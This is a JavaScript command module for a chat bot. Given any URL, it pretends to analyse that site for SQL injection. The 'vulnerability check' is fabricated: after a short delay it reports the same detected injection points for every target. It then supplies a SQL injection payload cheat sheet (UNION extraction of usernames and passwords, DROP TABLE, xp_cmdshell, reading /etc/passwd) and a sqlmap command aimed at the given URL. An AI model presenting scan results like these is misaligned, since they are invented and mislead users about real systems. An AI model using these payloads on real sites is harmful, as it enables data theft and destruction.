const { isPaired } = require("../../lib/auth")
module.exports = {
  name: "sqlinject",
  async execute(sock, msg, args, sender) {
    const jid = msg.key.remoteJid
    if (!isPaired(sender)) return sock.sendMessage(jid, { text: "❌ Paired users only!" })
    const url = args[0]
    if (!url) return sock.sendMessage(jid, {
      text: "💉 *SQL Injection Analyzer*\n\nUsage: .sqlinject <url>\nExample: .sqlinject https://target.com/page?id=1\n\n⚠️ Educational purposes only!"
    })
    await sock.sendMessage(jid, { text: "💉 *Analyzing SQL injection vectors for:*\n" + url + "\n\n⏳ Running checks..." })
    await new Promise(r => setTimeout(r, 1500))
    await sock.sendMessage(jid, {
      text: "💉 *SQL INJECTION ANALYSIS*\n\n" +
            "🎯 Target: `" + url + "`\n\n" +
            "═══ 🔍 VULNERABILITY CHECK ═══\n\n" +
            "📊 *Injection Points Detected:*\n" +
            "• GET parameters: id, user, page, search\n" +
            "• POST body: username, password, email\n" +
            "• HTTP Headers: X-Forwarded-For, Referer\n\n" +
            "═══ 💣 ATTACK PAYLOADS ═══\n\n" +
            "```\n" +
            "# Error-based SQLi\n" +
            "' OR 1=1--\n" +
            "' AND 1=2 UNION SELECT NULL--\n" +
            "'; DROP TABLE users;--\n\n" +
            "# Blind Boolean-based\n" +
            "' AND 1=1--  (true)\n" +
            "' AND 1=2--  (false)\n" +
            "' AND SLEEP(5)--\n\n" +
            "# UNION-based Data Extraction\n" +
            "' UNION SELECT table_name,2 FROM information_schema.tables--\n" +
            "' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'--\n" +
            "' UNION SELECT username,password FROM users--\n\n" +
            "# Out-of-band\n" +
            "'; exec xp_cmdshell('whoami')--\n" +
            "' OR LOAD_FILE('/etc/passwd')--\n" +
            "```\n\n" +
            "═══ 🛡️ DEFENSE METHODS ═══\n\n" +
            "✅ Use Prepared Statements / Parameterized Queries\n" +
            "✅ Input validation & sanitization\n" +
            "✅ WAF (Web Application Firewall)\n" +
            "✅ Least privilege database accounts\n" +
            "✅ Error message suppression\n\n" +
            "═══ 🔧 TOOLS ═══\n\n" +
            "• SQLMap: `sqlmap -u \"" + url + "\" --dbs`\n" +
            "• OWASP ZAP: GUI-based scanner\n" +
            "• Burp Suite: Intercept & modify requests\n" +
            "• HackerTarget: Online scanner\n\n" +
            "⚠️ *Only test systems you own or have permission to test!*\n" +
            "_Powered by VECTOR MD_"
    })
  }
}
